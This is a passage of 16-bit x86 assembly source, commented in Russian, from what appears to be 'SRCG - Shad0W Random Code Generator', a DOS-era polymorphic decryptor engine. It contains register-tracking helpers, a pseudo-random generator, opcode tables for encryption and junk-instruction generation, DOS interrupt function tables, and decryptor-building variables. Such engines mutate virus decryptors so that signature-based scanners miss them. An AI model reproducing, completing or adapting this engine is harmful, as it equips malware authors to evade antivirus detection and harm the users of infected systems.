		mov al,1
		rol al,cl
		or REG_USED,al
		pop ax
		ret

;------------------------------------------------------------------------------
UnmarkRegister:	push ax
		mov al,0FEh
		rol al,cl
		and REG_USED,al
		pop ax
		ret

;------------------------------------------------------------------------------
;Генератор случайных чисел (ну почти случайных...) Output - число в AX
;------------------------------------------------------------------------------
Rnd:		push dx
		push cx
		mov cx,ax
		call RandomWord
		xor dx,dx
		jcxz Div0
		div cx
Div0:		mov ax,dx
		pop cx
		pop dx
		ret

RandomWord:     push dx
                push bx
                push cx

                mov ax,38ADh
                mul word ptr cs:[RndData]
                xchg cx,dx
                xchg bx,ax

                mov ax,38ADh
                mul word ptr cs:[RndData+2]
                add cx,ax

                mov ax,9E1h
                mul word ptr cs:[RndData]
                add cx,ax
                
                xchg dx,cx
                xchg ax,bx

                add ax,62E9h
                adc dx,3619h

                mov word ptr cs:[RndData],ax
                mov word ptr cs:[RndData+2],dx

                pop cx
                pop bx
                pop dx

                ret

RndData dd 0

;------------------------------------------------------------------------------
;Таблицы опкодов
;------------------------------------------------------------------------------
TableOfCommands:
db 0,0F6h,18h	;0	neg byte ptr [bx+si]
db 1,0F6h,10h	;1	not byte ptr [bx+si]
db 3,0FEh,0	;2	inc byte ptr [bx+si]
db 2,0FEh,8	;3	dec byte ptr [bx+si]
db 37,30h,0	;4	xor byte ptr [bx+si],al
db 69,80h,30h	;5	xor byte ptr [bx+si],0
db 39,88h,0	;6	mov byte ptr [bx+si],al
db 71,0C6h,0	;7	mov byte ptr [bx+si],0
db 43,00h,0	;8	add byte ptr [bx+si],al
db 75,80h,0	;9	add byte ptr [bx+si],0
db 41,28h,0	;10	sub byte ptr [bx+si],al
db 73,80h,28h	;11	sub byte ptr [bx+si],0
db 14,0D0h,0	;12	rol byte ptr [bx+si],1
db 143,0D2h,0	;13	rol byte ptr [bx+si],cl
db 12,0D0h,8	;14	ror byte ptr [bx+si],1
db 141,0D2h,8	;15	ror byte ptr [bx+si],cl

Trash1:
db 0,0CCh	;int 3
db 0,0FCh	;cld
db 0,0F8h	;clc
db 0C0h,0A6h	;cmpsb
db 41h,0ACh	;lodsb
db 0,0CCh	;int 3
db 4,99h	;cwd
db 0,0F8h	;clc
db 41h,0ACh	;lodsb
db 0,0CCh	;int 3
db 1,98h	;cbw
db 0,0F5h	;cmc
db 0,0FCh	;cld
db 0,0CCh	;int 3
db 0,0F9h	;stc
db 0,0FDh	;std

Trash2:
db 8Ah,0	;mov al,al
db 8Ah,0	;mov al,al
db 22h,0	;and al,al
db 22h,0	;and al,al
db 0Ah,0	;or al,al
db 0Ah,0	;or al,al
db 32h,0	;xor al,al
db 32h,0	;xor al,al
db 02h,0	;add al,al
db 02h,0	;add al,al
db 12h,0	;adc al,al
db 2Ah,0	;sub al,al
db 2Ah,0	;sub al,al
db 1Ah,0	;sbb al,al
db 3Ah,1	;cmp al,al
db 84h,1	;test al,al

Trash3:
db 0F6h,0D8h	;neg al
db 0F6h,0D0h	;not al
db 0D0h,0D0h	;rcl al,1
db 0D0h,0D8h	;rcr al,1
db 0D2h,0E0h	;sal al,cl
db 0D0h,0E0h	;sal al,1
db 0D2h,0F8h	;sar al,cl
db 0D0h,0F8h	;sar al,1
db 0D2h,0E0h	;shl al,cl
db 0D0h,0E0h	;shl al,1
db 0D2h,0E8h	;shr al,cl
db 0D0h,0E8h	;shr al,1
db 0D2h,0C0h	;rol al,cl
db 0D0h,0C0h	;rol al,1
db 0D2h,0C8h	;ror al,cl
db 0D0h,0C8h	;ror al,1

Trash4:
db 80h,0E0h	;and al,0
db 80h,0E0h	;and al,0
db 80h,0C8h	;or al,0
db 80h,0C8h	;or al,0
db 80h,0F0h	;xor al,0
db 80h,0F0h	;xor al,0
db 80h,0C0h	;add al,0
db 80h,0C0h	;add al,0
db 80h,0D0h	;adc al,0
db 80h,0E8h	;sub al,0
db 80h,0E8h	;sub al,0
db 80h,0D8h	;sbb al,0
db 80h,0F8h	;cmp al,0
db 0F6h,0C0h	;test al,0
db 0,0B0h	;mov al,0
db 0,0B0h	;mov al,0

FunctionTable:
db 0Fh,10h,0FFh,3
db 1,10h,0FFh,08h
db 9,10h,0FFh,0Fh
db 1,21h,0FFh,19h
db 7,21h,0FFh,2Ah
db 7,21h,0FFh,2Ch
db 0Bh,21h,0FFh,30h
db 5,21h,0,33h
db 5,21h,5,33h
db 1Fh,21h,0FFh,36h
db 5,21h,0FFh,42h
db 9,21h,0FFh,51h
db 1,21h,0FFh,054h
db 7,21h,0,57h
db 9,21h,0FFh,62h
db 0Dh,21h,1,66h

;------------------------------------------------------------------------------
;Немного копирайтов
ProductName db "SRCG - S╫ad0W Random Code Generator. V1.0"
;------------------------------------------------------------------------------

;------------------------------------------------------------------------------
;Переменные, используемые SRCG.
;------------------------------------------------------------------------------
Prefix: db 26h			; es:
Cryptor: db 6 dup (0),0C3h	;здесь собирается шифрующая инструкция

TheEnd EQU $

REG_USED db (?)	;занятые регистры: 7  6  5  4  3  2  1  0
;	 			   │  │  │  │  │  │  │  │
;				   di si bp sp bx dx cx ax

Flag dw (?)
;bit	0 - reserved
;	1 - reserved
;	2 - reserved
;	3 - reserved
;	4 = 1 - disable simple jumps
;	5 = 1 - disable PUSH OFFSET / RET
;	6 = 1 - disable JMP REG
;	7 = 1 - disable PUSH REG / RET
;	8 = 1 - disable PUSH / POP
;	9 - reserved
;	10 - reserved
;	11 = 1 - disable CMP / TEST
;	12 - reserved
;	13 = 1 - make push (if 0 - pop)
;	14 - used in FIND_BLOCK sub
;	15 - flag DECRYPTOR COMPLITED


Reg1 db (?)
AdrPart1 dw (?)
Reg2 db (?)
AdrPart2 dw (?)
Reg3 db (?)
Argument dw (?)
Status db (?)

CSIZE dw (?)
DECRYPTOR dw (?)
DECRYPTOR_OFFSET dw (?)
CRYPT_ADR dw (?)
CRYPT_LEN dw (?)
CODE_OFFSET dw (?)
TABLE_ADRESS dw (?)
OLD_STACK dw (?)

AdrLOOP dw (?)
EntryPoint dw (?)

SegRegsOffset dw (?)
MainDecryptorEntry dw (?)
OldFlags dw (?)

;******************************************************************************
;END OF S╫ad0W RANDOM CODE GENERATOR
;******************************************************************************